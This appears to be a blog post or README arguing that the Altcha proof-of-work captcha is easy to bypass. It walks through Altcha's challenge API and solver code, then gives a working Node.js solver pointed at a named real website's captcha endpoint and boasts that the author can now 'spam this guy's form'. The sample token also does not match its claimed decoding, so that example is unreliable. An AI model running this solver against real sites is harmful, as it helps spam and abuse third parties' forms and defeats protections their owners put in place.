# What is Altcha

<img src="https://www.rylesoftware.com/images/blog/seo/altcha-logo.webp" height="100">

Altcha is an open-source PoW captcha used by some small websites. This document demonstrates how it can be bypassed easily and is therefore ineffective at detering bots.
Automated programs can solve PoW challenges just as good as real browsers can, if not better (take a look at crypto mining as an example). Proof-of-work captchas are just a waste of CPU power.

# Taking a look at Altcha's API

Lets use a site called `https://moomoo.io` as an example. 

When you click "I'm not a robot" on a site that uses Altcha, a HTTP GET request is sent to an API endpoint, which, in this case, is `https://api.moomoo.io/verify`.

<img src="https://files.catbox.moe/63m83f.png" height="200">

The server responds with some JSON data, which includes the necessary information for the client to solve the challenge:

```json
{
  "algorithm": "SHA-256",
  "challenge": "deffa2468786b9cb9f3434537253974280b3cb01ee1a963bd2aa3f1f65cd88bf",
  "maxnumber": 100000,
  "salt": "0e93eb05a8c15662?expires=1774963974&",
  "signature": "7ba86eb40631837c2577950a21dd1671cadbc1a4d15c0ff00b09889812846a35"
}
```

The client solves the challenge and returns a base-64-encoded string of data (the response token):

`eyJhbGdvcml0aG0iOiJTSEEtMjU2IiwiY2hhbGxlbmdlIjoiMzNiNjI4YmNmNGE0YjE1OWY3MWJiZDNjZmIyZjI1ZTQwMzljMTdiMWU5NTczNjkxZWVkOWI1MzkyZTE4NTZlMSIsIm51bWJlciI6NDYyOTY1LCJzYWx0IjoiYzEwY2VjYzZmNzcxZDFjNDJiOTYwYjcwP2V4cGlyZXM9MTc3NDk1ODI3MSIsInNpZ25hdHVyZSI6ImZiOTNmOTNhZmI2NjAzZmI2NWQyMWJhNjI2Mzg1NDJkOGYxNTY3NWJiYTU4OGQzMTI0YjVhOGRhMTA3NjYxY2EiLCJ0b29rIjoxNjI5NH0=`

which decodes to:

```json
{
  "algorithm": "SHA-256",
  "challenge": "deffa2468786b9cb9f3434537253974280b3cb01ee1a963bd2aa3f1f65cd88bf",
  "number": 5834,
  "salt": "0e93eb05a8c15662?expires=1774963974&",
  "signature": "7ba86eb40631837c2577950a21dd1671cadbc1a4d15c0ff00b09889812846a35",
  "took": 2492
}
```

# Taking a look at Altcha's source code

The part we're interested in is **how** the client solves the challenge. Since Altcha is open-source, we can take a quick look at their source code to find out.
Altcha uses a module bundler called Vite, and taking a look at their configuration, the entrypoint for their program is called [entry.ts](https://github.com/altcha-org/altcha/blob/main/src/entry.ts), and at the top of that file, there are three imports:

```ts
import InlineWorker from './worker?worker&inline';
import Altcha from './Altcha.svelte';
import globalCss from './altcha.css?raw';
```

The only import we really care about is `InlineWorker`, which is imported from [worker.ts](https://github.com/altcha-org/altcha/blob/main/src/worker.ts).

```ts
import { solveChallenge, clarifyData } from './helpers';
```

There is a function named solveChallenge which is imported from helpers.ts. Here's the solveChallenge function:

```ts
export function solveChallenge(
  challenge: string,
  salt: string,
  algorithm: string = 'SHA-256',
  max: number = 1e6,
  start: number = 0
): { promise: Promise<Solution | null>; controller: AbortController } {
  const controller = new AbortController();
  const startTime = Date.now();
  const fn = async () => {
    for (let n = start; n <= max; n += 1) {
      if (controller.signal.aborted) {
        return null;
      }
      const t = await hashChallenge(salt, n, algorithm);
      if (t === challenge) {
        return {
          number: n,
          took: Date.now() - startTime,
        };
      }
    }
    return null;
  };
  return {
    promise: fn(),
    controller,
  };
}
```

Although this is barely readable because it's indented with 2 spaces (ew), we can still extract some information:

1. It takes five arguments - challenge, salt, algorithm, max, and start; all of which (except for start) are provided to us by the HTTP GET request we made earlier.
2. It stores the current Unix timestamp in a constant called `startTime`:
```ts
const startTime = Date.now();
```
3. It creates a `for` loop which loops from `start` to `max`:
```ts
for (let n = start; n <= max; n += 1) {
  if (controller.signal.aborted) {
    return null;
  }
  const t = await hashChallenge(salt, n, algorithm);
  if (t === challenge) {
    return {
      number: n,
      took: Date.now() - startTime,
    };
  }
}
```
4. Each iteration, it calls `hashChallenge` and passes in the salt, number, and hashing algorithm. The `hashChallenge` function just appends the number to the salt and hashes it using the specified algorithm.
```ts
export async function hashChallenge(
  salt: string,
  num: number,
  algorithm: string
): Promise<string> {
  if (typeof crypto === 'undefined' || !('subtle' in crypto) || !('digest' in crypto.subtle)) {
    throw new Error('Web Crypto is not available. Secure context is required (https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts).');
  }
  return ab2hex(
    await crypto.subtle.digest(
      algorithm.toUpperCase(),
      encoder.encode(salt + num)
    )
  );
}
```
5. It continues this loop until the return value of `hashChallenge(salt, n, algorithm);` is equal to the challenge variable.
6. When the solution is found, it sends the result back to `worker.ts`.

# A Proof-Of-Concept

Here's a simple Node.JS proof-of-concept to demonstrate how Altcha can be easily solved by automated programs:

```js
import { createHash } from 'crypto';

class AltSolver {
	async getCaptcha(apiUrl, ...optionalArgs) {
		const resp = await fetch(apiUrl, ...optionalArgs);

		if (resp.status !== 200) {
			throw new Error('API returned non-200 status code');
		} else {
			const json = await resp.json();
			return json;
		}
	}

	hashChallenge(salt, number, algorithm) {
		const hash = createHash(algorithm.toUpperCase())
			.update(salt + number)
			.digest('hex');

		return hash;
	}

	encodeSolution(solution) {
		return btoa(JSON.stringify(solution));
	}

	solveCaptcha(captcha) {
		const algorithm = captcha.algorithm;
		const challenge = captcha.challenge;
		const signature = captcha.signature;
		const salt = captcha.salt;

		const startTime = Date.now();

		const max = captcha.maxnumber;
		const start = 0;

		for (let number = start; number <= max; number++) {
			const hash = this.hashChallenge(salt, number, algorithm);

			if (hash === challenge) {
				const solution = {
					algorithm: algorithm,
					challenge: challenge,
					number: number,
					salt: salt,
					signature: signature,
					took: Date.now() - startTime
				};

				return this.encodeSolution(solution);
			}
		}
	}
}

(async () => {
	const solver = new AltSolver();

	const captcha = await solver.getCaptcha('https://euosha.gestmax.eu/altcha'); // i'm using this site as an example because moomoo.io has cloudflare protection
	const solution = solver.solveCaptcha(captcha);

	console.log(`Found solution:\n\n${solution}`);
})();

```

and BOOM! We can now spam this guy's form, since he's using an insecure captcha service that's easy to bypass:

<img src="https://files.catbox.moe/b3rsj9.png">

# What if I want to protect my site against bots?

If you want to protect your site against bots, then I suggest you use a better captcha service such as reCaptcha, which is way more expensive for bots to solve, as it would require the use of AI.
If you prefer using open-source tools, then you can look for some reCaptcha alternatives.
